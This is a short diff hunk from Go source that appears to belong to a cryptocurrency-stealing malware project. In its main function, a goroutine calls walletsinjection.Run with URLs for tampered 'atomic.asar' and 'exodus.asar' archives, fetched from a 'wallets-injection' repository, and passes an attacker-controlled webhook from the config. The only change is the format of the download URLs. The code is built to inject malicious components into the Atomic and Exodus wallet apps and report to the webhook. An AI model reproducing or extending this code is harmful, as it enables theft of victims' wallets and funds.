@@ -54,8 +54,8 @@ func main() {
 		CONFIG["webhook"].(string),
 	)
 	go walletsinjection.Run(
-		"https://raw.githubusercontent.com/hackirby/wallets-injection/main/atomic.asar",
-		"https://raw.githubusercontent.com/hackirby/wallets-injection/main/exodus.asar",
+		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
+		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
 		CONFIG["webhook"].(string),
 	)
 
